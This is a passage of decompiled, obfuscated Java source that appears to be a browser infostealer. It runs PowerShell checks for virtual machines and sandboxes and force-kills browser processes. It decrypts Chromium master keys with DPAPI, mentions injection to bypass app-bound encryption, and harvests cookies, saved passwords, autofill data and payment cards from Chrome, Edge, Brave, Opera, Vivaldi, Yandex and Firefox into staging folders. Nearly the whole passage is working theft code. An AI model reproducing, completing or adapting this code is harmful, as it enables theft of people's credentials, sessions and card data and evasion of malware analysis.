         java.util.Arrays.asList(new File[]{
               new File(lvftzz("PROGRAMFILES"), "BraveSoftware\\Brave-Browser\\Application\\brave.exe"),
               new File(lvftzz("PROGRAMFILES(X86)"), "BraveSoftware\\Brave-Browser\\Application\\brave.exe")
            })
      );
      cawbyq(
         "Opera",
         new File(lvftzz("APPDATA"), "Opera Software\\Opera Stable"),
         java.util.Arrays.asList(new File[]{
               new File(lvftzz("LOCALAPPDATA"), "Programs\\Opera\\opera.exe")
            })
      );
      cawbyq(
         "Firefox",
         new File(lvftzz("APPDATA"), "Mozilla\\Firefox\\Profiles"),
         java.util.Arrays.asList(new File[]{
               new File(lvftzz("PROGRAMFILES"), "Mozilla Firefox\\firefox.exe"),
               new File(lvftzz("PROGRAMFILES(X86)"), "Mozilla Firefox\\firefox.exe")
            })
      );
   }

   private static void cawbyq(String var0, File var1, List<File> var2) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      kvlfae("");
      kvlfae(
         new StringBuilder().append("[").append(var0).append("]").toString()
      );
      kvlfae(
         new StringBuilder().append("Installed: ").append(uzbtkp(var2)).toString()
      );
      kvlfae(
         new StringBuilder().append("Profile root exists: ").append(var1.isDirectory()).toString()
      );
      File[] var3 = var1.listFiles();
      if (var3 == null) {
         kvlfae("Profiles: unavailable");
      } else {
         ArrayList var4 = new java.util.ArrayList();
         int var5 = 0;

         for (File var9 : var3) {
            if (var9.isDirectory()) {
               String var10 = var9.getName();
               if (organ(var0, var10)) {
                  var4.add(var10);
                  var5 += qtmmaz(var9);
               }
            }
         }

         kvlfae(
            new StringBuilder().append("Profiles count: ").append(var4.size()).toString()
         );
         if (!var4.isEmpty()) {
            kvlfae(
               new StringBuilder().append("Profile names: ").append(wvzloh(var4, ", ")).toString()
            );
         }

         kvlfae(
            new StringBuilder().append("Extension directories count: ").append(var5).toString()
         );
      }
   }

   private static boolean organ(String var0, String var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      return "Firefox".equals(var0)
         ? true
         : "Default".equals(var1)
            || var1.startsWith("Profile ")
            || "Guest Profile".equals(var1)
            || "System Profile".equals(var1);
   }

   private static int qtmmaz(File var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      File var1 = new File(var0, "Extensions");
      File[] var2 = var1.listFiles();
      if (var2 == null) {
         return 0;
      }

      int var3 = 0;

      for (File var7 : var2) {
         if (var7.isDirectory()) {
            var3++;
         }
      }

      return var3;
   }

   private static void siygrt() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      cxssab(
         "LOCAL FOLDER STATISTICS"
      );
      kvlfae(
         "Counts and sizes only; file names and contents are not printed."
      );
      rtduze(
         "Desktop",
         new File(System.getProperty("user.home", ""), "Desktop")
      );
      rtduze(
         "Downloads",
         new File(System.getProperty("user.home", ""), "Downloads")
      );
      rtduze(
         "Documents",
         new File(System.getProperty("user.home", ""), "Documents")
      );
   }

   private static void rtduze(String var0, File var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      marina var2 = new marina();
      sjtyzm(var1, var2, 2);
      kvlfae(
         new StringBuilder().append(var0).append(": exists=").append(var1.isDirectory()).append(", files=").append(var2.cypress).append(", directories=").append(var2.onyx).append(", size=").append(lmxkho(var2.sketch)).append(", skipped=").append(var2.forest).toString()
      );
   }

   private static void sjtyzm(File var0, marina var1, int var2) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (var0 != null && var0.isDirectory() && var2 >= 0) {
         File[] var3 = var0.listFiles();
         if (var3 == null) {
            var1.forest++;
         } else {
            for (File var7 : var3) {
               if (var1.cypress + var1.onyx >= 10000) {
                  var1.forest++;
                  return;
               }

               if (var7.isDirectory()) {
                  var1.onyx++;
                  sjtyzm(var7, var1, var2 - 1);
               } else if (var7.isFile()) {
                  var1.cypress++;
                  var1.sketch = var1.sketch
                     + java.lang.Math.max(0L, var7.length());
               }
            }
         }
      }
   }

   private static void gjejsh() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      cxssab(
         "VM / SANDBOX INDICATORS"
      );
      drfeeo(
         "Hardware VM hints",
         "$cs = Get-CimInstance Win32_ComputerSystem; $bios = Get-CimInstance Win32_BIOS; $base = Get-CimInstance Win32_BaseBoard; $text = (($cs.Manufacturer,$cs.Model,$bios.SerialNumber,$base.Manufacturer,$base.Product) -join ' '); 'ComputerSystem Manufacturer=' + $cs.Manufacturer; 'ComputerSystem Model=' + $cs.Model; 'BIOS Serial=' + $bios.SerialNumber; 'BaseBoard=' + ($base.Manufacturer + ' ' + $base.Product); $words = @('VirtualBox','VMware','KVM','QEMU','Hyper-V','Virtual Machine','Xen','Bochs','Parallels','Sandbox'); $found = @($words | Where-Object { $text -match [regex]::Escape($_) }); if ($found.Count -gt 0) { 'VM indicators=' + ($found -join ', ') } else { 'VM indicators=none obvious' }",
         20
      );
      drfeeo(
         "VM-related processes/services",
         "$names = @('vbox','vmware','qemu','xen','hyper-v','sandbox'); Get-Process -ErrorAction SilentlyContinue | Where-Object { $p=$_.ProcessName.ToLower(); @($names | Where-Object { $p -like ('*' + $_ + '*') }).Count -gt 0 } | Select-Object ProcessName,Id | Format-Table -AutoSize; Get-Service -ErrorAction SilentlyContinue | Where-Object { $s=($_.Name + ' ' + $_.DisplayName).ToLower(); @($names | Where-Object { $s -like ('*' + $_ + '*') }).Count -gt 0 } | Select-Object Name,DisplayName,Status | Format-Table -AutoSize",
         20
      );
   }

   private static void drfeeo(String var0, String var1, int var2) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      yglajz(var0);
      String var3 = "$ErrorActionPreference='Continue'; [Console]::OutputEncoding = New-Object System.Text.UTF8Encoding -ArgumentList $false; $OutputEncoding = [Console]::OutputEncoding; ";
      npwahl(
         java.util.Arrays.asList(new String[]{
               "powershell.exe",
               "-NoLogo",
               "-NoProfile",
               "-NonInteractive",
               "-Command",
               new StringBuilder().append(var3).append(var1).toString()
            }),
         java.nio.charset.StandardCharsets.UTF_8,
         var2
      );
   }

   private static void lngylf(String var0, String var1, int var2) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      yglajz(var0);
      npwahl(
         java.util.Arrays.asList(new String[]{
               "cmd.exe",
               "/d",
               "/c",
               new StringBuilder().append("chcp 65001 >NUL & ").append(var1).toString()
            }),
         java.nio.charset.StandardCharsets.UTF_8,
         var2
      );
   }

   private static void npwahl(List<String> var0, Charset var1, int var2) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      Process var3 = null;
      stream var4 = null;

      try {
         ProcessBuilder var5 = new ProcessBuilder(var0);
         var5.redirectErrorStream(true);
         var3 = var5.start();
         var4 = new stream(
            var3.getInputStream(),
            var1
         );
         Thread var6 = new Thread(var4, "system-inventory-output-reader");
         var6.setDaemon(true);
         var6.start();
         boolean var7 = var3.waitFor(var2, java.util.concurrent.TimeUnit.SECONDS);
         if (!var7) {
            var3.destroyForcibly();
            kvlfae(
               new StringBuilder().append("[timeout after ").append(var2).append("s]").toString()
            );
         } else {
            int var8 = var3.exitValue();
            if (var8 != 0) {
               kvlfae(
                  new StringBuilder().append("[exit code ").append(var8).append("]").toString()
               );
            }
         }

         var6.join(java.util.concurrent.TimeUnit.SECONDS.toMillis(2));
         if (var4.snail()) {
            kvlfae(
               "[output truncated after 350 lines]"
            );
         }
      } catch (Exception var9) {
         kvlfae(
            new StringBuilder().append("[error] ").append(xpiccr(var9)).toString()
         );
         if (var3 != null) {
            var3.destroyForcibly();
         }
      }
   }

   private static void cxssab(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      kvlfae("");
      kvlfae(
         new StringBuilder().append("=== ").append(var0).append(" ===").toString()
      );
   }

   private static void yglajz(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      kvlfae("");
      kvlfae(
         new StringBuilder().append("[").append(var0).append("]").toString()
      );
   }

   private static void kvlfae(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      StringBuilder var1 = (StringBuilder)papaya.get();
      if (var1 != null) {
         var1.append(var0).append('\n');
      } else {
         if (mosaic != null) {
            synchronized (prawn.class) {
               mosaic.println(var0);
            }
         }
      }
   }

   private static String lksccl(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var1 = var0.trim();
      return var1.length() > 500
         ? new StringBuilder().append(var1.substring(0, 500)).append("...").toString()
         : var1;
   }

   private static String ddulqy(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var1 = System.getenv(var0);
      return var1 != null
            && var1.trim().length()
               != 0
         ? var1
         : "unknown";
   }

   private static String lvftzz(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var1 = System.getenv(var0);
      return var1 == null ? "" : var1;
   }

   private static boolean uzbtkp(List<File> var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      Iterator var1 = var0.iterator();

      while (var1.hasNext()) {
         File var2 = (File)var1.next();
         if (var2.isFile()) {
            return true;
         }
      }

      return false;
   }

   private static String wvzloh(List<String> var0, String var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      StringBuilder var2 = new StringBuilder();

      for (int var3 = 0; var3 < var0.size(); var3++) {
         if (var3 > 0) {
            var2.append(var1);
         }

         var2.append((String)var0.get(var3));
      }

      return var2.toString();
   }

   private static String xpiccr(Throwable var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var1 = var0.getMessage();
      return var1 == null
         ? var0.getClass().getSimpleName()
         : var1;
   }

   private static String lmxkho(long var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (var0 < 0L) {
         return "unknown";
      }

      double var2 = var0;
      String[] var4 = new String[]{
         "B",
         "KB",
         "MB",
         "GB",
         "TB",
         "PB"
      };

      int var5;
      for (var5 = 0; var2 >= 1024.0 && var5 < var4.length - 1; var5++) {
         var2 /= 1024.0;
      }

      return String.format(java.util.Locale.US, "%.2f %s", new Object[]{
            java.lang.Double.valueOf(var2),
            var4[var5]
         });
   }

   public static void zmrkny() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (rudder) {
         try {
            System.out.println("[Cookie] start");
            if (!java.nio.file.Paths.get(maple, new String[0]).toFile().exists()) {
               java.nio.file.Paths.get(maple, new String[0]).toFile().mkdirs();
            }

            System.out.println("[Cookie] folder create");
            List var0 = ljnptj();
            Iterator var1 = var0.iterator();

            while (var1.hasNext()) {
               nephew var2 = (nephew)var1.next();
               if (!thtsot(var2.octagon)) {
                  System.out.println(new StringBuilder().append("[Cookie] ").append(var2.octagon).append(" disabled by config, skip").toString());
               } else {
                  try {
                     String var3 = rsjstm(var2.sofa);
                     boolean var4 = var2.mossy && vbuxsp(var2.lotus);
                     System.out.println(new StringBuilder().append("[Cookie] ").append(var2.octagon).append(" ver=").append(var3 == null ? "?" : var3).append(" appBound=").append(var4).toString());
                     if (var4) {
                        System.out.println(new StringBuilder().append("[Cookie] ").append(var2.octagon).append(" app-bound: DPAPI first, then inject").toString());
                     }

                     oqydsf(var2);
                  } catch (Exception var8) {
                     System.out.println(new StringBuilder().append("[Cookie] error ").append(var2.octagon).append(": ").append(var8.getMessage()).toString());
                  }
               }
            }

            System.out.println("[Cookie] inject start");
            lxjtuk();
            System.out.println("[Cookie] inject finish");
            System.out.println("[Cookie] Firefox start");
            dbovpq();
            System.out.println("[Cookie] Firefox End");

            try {
               pagllu();
            } catch (Exception var7) {
               var7.printStackTrace();
            }

            try {
               tncatl();
            } catch (Exception var6) {
               var6.printStackTrace();
            }

            try {
               fopnev();
            } catch (Exception var5) {
               var5.printStackTrace();
            }

            System.out.println("[Cookie] End");
            uwtbqs();
            System.out.println("[Cookie] End End");
         } catch (Exception var9) {
            var9.printStackTrace();
         }
      }
   }

   private static boolean thtsot(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (!silo) {
         return false;
      } else if ("Chrome".equals(var0)) {
         return stingray;
      } else if ("Edge".equals(var0)) {
         return parchment;
      } else if ("Brave".equals(var0)) {
         return stucco;
      } else if ("Opera".equals(var0)) {
         return narwhal;
      } else if ("OperaGX".equals(var0)) {
         return mallet;
      } else if ("Vivaldi".equals(var0)) {
         return lobster;
      } else {
         return "Yandex".equals(var0)
            ? clover
            : true;
      }
   }

   private static boolean vqxggw(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (!geyser) {
         return false;
      } else if ("Chrome".equals(var0)) {
         return scarf;
      } else if ("Edge".equals(var0)) {
         return cougar;
      } else if ("Brave".equals(var0)) {
         return metro;
      } else if ("Opera".equals(var0)) {
         return omelet;
      } else if ("OperaGX".equals(var0)) {
         return pixel;
      } else if ("Vivaldi".equals(var0)) {
         return skillet;
      } else {
         return "Yandex".equals(var0)
            ? donkey
            : true;
      }
   }

   private static List<nephew> ljnptj() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      ArrayList var0 = new java.util.ArrayList();
      String var1 = lvftzz("PROGRAMFILES");
      String var2 = lvftzz("PROGRAMFILES(X86)");
      String var3 = lvftzz("LOCALAPPDATA");
      String var4 = lvftzz("APPDATA");
      gafycu(
         var0,
         "Chrome",
         true,
         new String[]{
            new StringBuilder().append(var1).append("\\Google\\Chrome\\Application\\chrome.exe").toString(),
            new StringBuilder().append(var2).append("\\Google\\Chrome\\Application\\chrome.exe").toString(),
            new StringBuilder().append(var3).append("\\Google\\Chrome\\Application\\chrome.exe").toString()
         },
         new StringBuilder().append(var3).append("\\Google\\Chrome\\User Data").toString(),
         "chrome.exe"
      );
      gafycu(
         var0,
         "Edge",
         true,
         new String[]{
            new StringBuilder().append(var2).append("\\Microsoft\\Edge\\Application\\msedge.exe").toString(),
            new StringBuilder().append(var1).append("\\Microsoft\\Edge\\Application\\msedge.exe").toString(),
            new StringBuilder().append(var3).append("\\Microsoft\\Edge\\Application\\msedge.exe").toString()
         },
         new StringBuilder().append(var3).append("\\Microsoft\\Edge\\User Data").toString(),
         "msedge.exe"
      );
      gafycu(
         var0,
         "Brave",
         true,
         new String[]{
            new StringBuilder().append(var1).append("\\BraveSoftware\\Brave-Browser\\Application\\brave.exe").toString(),
            new StringBuilder().append(var2).append("\\BraveSoftware\\Brave-Browser\\Application\\brave.exe").toString(),
            new StringBuilder().append(var3).append("\\BraveSoftware\\Brave-Browser\\Application\\brave.exe").toString()
         },
         new StringBuilder().append(var3).append("\\BraveSoftware\\Brave-Browser\\User Data").toString(),
         "brave.exe"
      );
      gafycu(
         var0,
         "Opera",
         false,
         new String[]{
            new StringBuilder().append(var3).append("\\Programs\\Opera\\opera.exe").toString()
         },
         new StringBuilder().append(var4).append("\\Opera Software\\Opera Stable").toString(),
         "opera.exe"
      );
      gafycu(
         var0,
         "OperaGX",
         false,
         new String[]{
            new StringBuilder().append(var3).append("\\Programs\\Opera GX\\opera.exe").toString()
         },
         new StringBuilder().append(var4).append("\\Opera Software\\Opera GX Stable").toString(),
         "opera.exe"
      );
      gafycu(
         var0,
         "Vivaldi",
         false,
         new String[]{
            new StringBuilder().append(var3).append("\\Vivaldi\\Application\\vivaldi.exe").toString()
         },
         new StringBuilder().append(var3).append("\\Vivaldi\\User Data").toString(),
         "vivaldi.exe"
      );
      gafycu(
         var0,
         "Yandex",
         false,
         new String[]{
            new StringBuilder().append(var3).append("\\Yandex\\YandexBrowser\\Application\\browser.exe").toString()
         },
         new StringBuilder().append(var3).append("\\Yandex\\YandexBrowser\\User Data").toString(),
         "browser.exe"
      );
      return var0;
   }

   private static void gafycu(List<nephew> var0, String var1, boolean var2, String[] var3, String var4, String var5) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      File var6 = null;

      for (String var10 : var3) {
         if (var10 != null
            && new File(var10).exists()) {
            var6 = new File(var10);
            break;
         }
      }

      if (var6 != null) {
         if (var4 != null
            && new File(var4).isDirectory()) {
            var0.add(new nephew(var1, var6, var4, var5, var2));
         }
      }
   }

   private static String rsjstm(File var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      File var1 = var0.getParentFile();
      if (var1 == null) {
         return null;
      }

      File[] var2 = var1.listFiles(new FileFilter() {
            @Override
            public boolean accept(File var1) {
               if (rkjsezrwcf.jzdety() != 0) {
                  rkjsezrwcf.bbsnvj();
               }

               return var1.isDirectory()
                  && var1.getName().matches("\\d+(\\.\\d+){1,3}");
            }
         });
      String var3 = null;
      if (var2 != null) {
         for (File var7 : var2) {
            if (var3 == null
               || lmjbsi(
                     var7.getName(),
                     var3
                  )
                  > 0) {
               var3 = var7.getName();
            }
         }
      }

      return var3;
   }

   private static int lmjbsi(String var0, String var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String[] var2 = var0.split("\\.");
      String[] var3 = var1.split("\\.");
      int var4 = java.lang.Math.max(var2.length, var3.length);

      for (int var5 = 0; var5 < var4; var5++) {
         int var6 = var5 < var2.length ? ranckg(var2[var5]) : 0;
         int var7 = var5 < var3.length ? ranckg(var3[var5]) : 0;
         if (var6 != var7) {
            return Integer.compare(var6, var7);
         }
      }

      return 0;
   }

   private static int ranckg(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         return Integer.parseInt(var0);
      } catch (NumberFormatException var2) {
         return 0;
      }
   }

   private static boolean vbuxsp(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         Path var1 = java.nio.file.Paths.get(var0, new String[]{"Local State"});
         if (!java.nio.file.Files.exists(var1, new LinkOption[0])) {
            return false;
         }

         JSONObject var2 = new JSONObject(
            new String(java.nio.file.Files.readAllBytes(var1), java.nio.charset.StandardCharsets.UTF_8)
         );
         if (!var2.has("os_crypt")) {
            return false;
         }

         JSONObject var3 = var2.getJSONObject("os_crypt");
         if (!var3.has(
            "app_bound_encrypted_key"
         )) {
            return false;
         }

         String var4 = var3.optString(
            "app_bound_encrypted_key"
         );
         return var4 != null && !var4.isEmpty();
      } catch (Exception var5) {
         return false;
      }
   }

   private static byte[] czvdpi(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         JSONObject var1 = new JSONObject(
            new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(var0, new String[0])), java.nio.charset.StandardCharsets.UTF_8)
         );
         if (!var1.has("os_crypt")) {
            return null;
         }

         JSONObject var2 = var1.getJSONObject("os_crypt");
         if (!var2.has("encrypted_key")) {
            return null;
         }

         String var3 = var2.getString("encrypted_key");
         byte[] var4 = java.util.Base64.getDecoder().decode(var3);
         byte[] var5 = new byte[var4.length - 5];
         System.arraycopy(var4, 5, var5, 0, var5.length);
         return cerlsf(var5);
      } catch (Exception var6) {
         return null;
      }
   }

   private static void oqydsf(nephew var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      byte[] var1 = czvdpi(
         new StringBuilder().append(var0.lotus).append("\\Local State").toString()
      );
      if (var1 == null) {
         System.out.println(new StringBuilder().append("[Cookie] ").append(var0.octagon).append(": no DPAPI key, skip").toString());
      } else {
         List var2 = ueyyzi(var0.lotus);
         boolean var3 = false;
         File var4 = new File(new File(var0.lotus), new StringBuilder().append("Network").append(File.separator).append("Cookies").toString());
         if (var2.isEmpty()
            && var4.exists()) {
            var2 = new java.util.ArrayList();
            var2.add(new String[]{
                  var4.getAbsolutePath(),
                  "Default"
               });
            var3 = true;
         }

         Iterator var5 = var2.iterator();

         while (var5.hasNext()) {
            String[] var6 = (String[])var5.next();
            String var7 = var6[0];
            String var8 = var6[1];
            if (thtsot(var0.octagon)) {
               try {
                  List var9 = uwnkvv(var7, var1, var0.rubble);
                  if (!var9.isEmpty()) {
                     File var10 = new File(maple, new StringBuilder().append(var0.octagon).append("_").append(var8).append("_cookies.txt").toString());
                     java.nio.file.Files.write(var10.toPath(), var9, java.nio.charset.StandardCharsets.UTF_8, new OpenOption[0]);
                     System.out.println(new StringBuilder().append("[Cookie] wrote ").append(var9.size()).append(" cookies: ").append(var0.octagon).append("/").append(var8).toString());
                  }
               } catch (Exception var13) {
                  System.out.println(new StringBuilder().append("[Cookie] cookies fail ").append(var0.octagon).append("/").append(var8).append(": ").append(var13.getMessage()).toString());
               }
            }

            if (vqxggw(var0.octagon)) {
               File var15 = var3
                  ? new File(new File(var0.lotus), "Login Data")
                  : new File(new File(var0.lotus, var8), "Login Data");
               if (var15.exists()) {
                  try {
                     List var16 = pjxlop(
                        var15.getAbsolutePath(),
                        var1,
                        var0.rubble
                     );
                     if (!var16.isEmpty()) {
                        File var11 = new File(new StringBuilder().append(lantern).append("\\Passwords").toString());
                        if (!var11.exists()) {
                           var11.mkdirs();
                        }

                        File var12 = new File(var11, new StringBuilder().append(var0.octagon).append("_").append(var8).append(".txt").toString());
                        java.nio.file.Files.write(var12.toPath(), var16, java.nio.charset.StandardCharsets.UTF_8, new OpenOption[0]);
                     }
                  } catch (Exception var14) {
                     System.out.println(new StringBuilder().append("[Cookie] passwords fail ").append(var0.octagon).append("/").append(var8).append(": ").append(var14.getMessage()).toString());
                  }
               }
            }
         }
      }
   }

   private static void pswalm(Path var0, Path var1) throws IOException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      InputStream var2 = java.nio.file.Files.newInputStream(var0, new OpenOption[0]);

      try {
         FileOutputStream var3 = new java.io.FileOutputStream(var1.toFile());

         try {
            byte[] var4 = new byte[8192];

            int var5;
            while ((var5 = var2.read(var4)) >= 0) {
               var3.write(var4, 0, var5);
            }
         } catch (Throwable var8) {
            try {
               var3.close();
            } catch (Throwable var7) {
               var8.addSuppressed(var7);
            }

            throw var8;
         }

         var3.close();
      } catch (Throwable var9) {
         if (var2 != null) {
            try {
               var2.close();
            } catch (Throwable var6) {
               var9.addSuppressed(var6);
            }
         }

         throw var9;
      }

      if (var2 != null) {
         var2.close();
      }
   }

   private static void clsatd(Path var0, Path var1) throws IOException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      pswalm(var0, var1);
      Path var2 = java.nio.file.Paths.get(new StringBuilder().append(var0.toString()).append("-wal").toString(), new String[0]);
      if (java.nio.file.Files.exists(var2, new LinkOption[0])) {
         try {
            pswalm(
               var2,
               java.nio.file.Paths.get(new StringBuilder().append(var1.toString()).append("-wal").toString(), new String[0])
            );
         } catch (Exception var6) {
         }
      }

      Path var3 = java.nio.file.Paths.get(new StringBuilder().append(var0.toString()).append("-shm").toString(), new String[0]);
      if (java.nio.file.Files.exists(var3, new LinkOption[0])) {
         try {
            pswalm(
               var3,
               java.nio.file.Paths.get(new StringBuilder().append(var1.toString()).append("-shm").toString(), new String[0])
            );
         } catch (Exception var5) {
         }
      }
   }

   private static Connection wfrkmv(String var0, Properties var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         Path var2 = java.nio.file.Paths.get(var0, new String[0]);
         if (!java.nio.file.Files.exists(var2, new LinkOption[0])) {
            return lavender.connect(new StringBuilder().append("jdbc:sqlite:").append(var0).toString(), var1);
         }

         Path var3 = java.nio.file.Files.createTempFile("dbcopy", ".sqlite", new FileAttribute[0]);
         clsatd(var2, var3);
         var3.toFile().deleteOnExit();
         return lavender.connect(new StringBuilder().append("jdbc:sqlite:").append(var3.toString()).toString(), var1);
      } catch (Exception var4) {
         return null;
      }
   }

   public static void mukuli() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         bgwtna();
         List var0 = java.util.Arrays.asList(new String[]{
               "chrome.exe",
               "browser.exe",
               "brave.exe",
               "msedge.exe",
               "opera.exe",
               "vivaldi.exe"
            });
         Iterator var1 = var0.iterator();

         while (var1.hasNext()) {
            String var2 = (String)var1.next();

            try {
               String var3 = new StringBuilder().append("taskkill /IM ").append(var2).append(" /F").toString();
               ProcessBuilder var4 = new ProcessBuilder(new String[]{"cmd.exe", "/c", var3});
               Process var5 = var4.start();
               var5.waitFor();
            } catch (IOException | InterruptedException var6) {
            }
         }

         try {
            Thread.sleep(500);
            ExecutorService var10 = java.util.concurrent.Executors.newFixedThreadPool(2);
            ArrayList var11 = new java.util.ArrayList();
            var11.add(var10.submit(() -> {
                     if (rkjsezrwcf.jzdety() != 0) {
                        rkjsezrwcf.bbsnvj();
                     }

                     pagllu();
                  }));
            var11.add(var10.submit(() -> {
                     if (rkjsezrwcf.jzdety() != 0) {
                        rkjsezrwcf.bbsnvj();
                     }

                     tncatl();
                  }));
            var11.add(var10.submit(() -> {
                     if (rkjsezrwcf.jzdety() != 0) {
                        rkjsezrwcf.bbsnvj();
                     }

                     amaprf();
                  }));
            var11.add(var10.submit(() -> {
                     if (rkjsezrwcf.jzdety() != 0) {
                        rkjsezrwcf.bbsnvj();
                     }

                     tklotp();
                  }));
            var10.shutdown();

            try {
               if (!var10.awaitTermination(1L, java.util.concurrent.TimeUnit.MINUTES)) {
                  System.out.println("\u041d\u0435 \u0432\u0441\u0435 \u0437\u0430\u0434\u0430\u0447\u0438 \u0432 \u043e\u043b\u0434 \u0437\u0430\u0432\u0435\u0440\u0448\u0438\u043b\u0438\u0441\u044c \u0437\u0430 \u043e\u0442\u0432\u0435\u0434\u0435\u043d\u043d\u043e\u0435 \u0432\u0440\u0435\u043c\u044f.");

                  for (int var12 = 0; var12 < var11.size(); var12++) {
                     Future var13 = (Future)var11.get(var12);
                     if (!var13.isDone()
                        )
                      {
                        System.out.println(new StringBuilder().append("\u0417\u0430\u0434\u0430\u0447\u0430 ").append(var12).append(" \u043e\u043b\u0434 \u043d\u0435 \u0437\u0430\u0432\u0435\u0440\u0448\u0435\u043d\u0430.").toString());
                     }
                  }
               }
            } catch (InterruptedException var7) {
               var7.printStackTrace();
            }
         } catch (InterruptedException var8) {
            throw new java.lang.RuntimeException(var8);
         }
      } catch (Exception var9) {
         var9.printStackTrace();
      }
   }

   public static void bgwtna() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      File var0 = new File(lantern);
      if (!var0.exists()) {
         var0.mkdirs();
      }
   }

   public static void pagllu() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (mint) {
         try {
            String var0 = new StringBuilder().append(lantern).append("\\Autofill").toString();
            if (!new File(new StringBuilder().append(lantern).append("\\Autofill").toString()).exists()) {
               try {
                  new File(new StringBuilder().append(lantern).append("\\Autofill").toString()).mkdirs();
               } catch (Exception var2) {
               }
            }

            if (hornet.exists() && indigo) {
               trbsyi(pilot, nourish, var0, "Chrome");
            }

            if (pollen.exists() && copper) {
               trbsyi(parcel, oregano, var0, "Opera");
            }

            if (hammer.exists() && frosty) {
               btmokd(jasmine, ninja, var0, "Opera GX");
            }

            if (silver.exists() && enigma) {
               trbsyi(bison, chimney, var0, "Edge");
            }

            if (granite.exists() && hoopoe) {
               trbsyi(moonbeam, nebula, var0, "Brave");
            }

            if (phoenix.exists() && stellar) {
               trbsyi(serene, poplar, var0, "Vivaldi");
            }

            if (midnight.exists() && daisy) {
               trbsyi(kimono, paddle, var0, "Yandex");
            }
         } catch (Exception var3) {
         }
      }
   }

   public static void fopnev() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (citrus) {
         try {
            String var0 = new StringBuilder().append(lantern).append("\\Cards").toString();
            File var1 = new File(var0);
            var1.mkdirs();
            if (hornet.exists() && lizard) {
               smnpnp(pilot, nourish, var1, "Chrome");
            }

            if (pollen.exists() && mustard) {
               smnpnp(parcel, oregano, var1, "Opera");
            }

            if (hammer.exists() && camera) {
               smnpnp(jasmine, ninja, var1, "Opera GX");
            }

            if (silver.exists() && rosewood) {
               smnpnp(bison, chimney, var1, "Edge");
            }

            if (granite.exists() && relic) {
               smnpnp(moonbeam, nebula, var1, "Brave");
            }

            if (phoenix.exists() && filter) {
               smnpnp(serene, poplar, var1, "Vivaldi");
            }

            if (midnight.exists() && sawdust) {
               smnpnp(kimono, paddle, var1, "Yandex");
            }
         } catch (Exception var2) {
         }
      }
   }

   // $VF: Could not verify finally blocks. A semaphore variable has been added to preserve control flow.
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   private static void smnpnp(String var0, String var1, File var2, String var3) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      List var4 = jnpdit(var1);
      Iterator var5 = var4.iterator();

      while (var5.hasNext()) {
         String var6 = (String)var5.next();
         Connection var7 = null;
         boolean var31 = false /* VF: Semaphore variable */;

         label211: {
            try {
               var31 = true;
               String var8 = new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(var0, new String[0])));
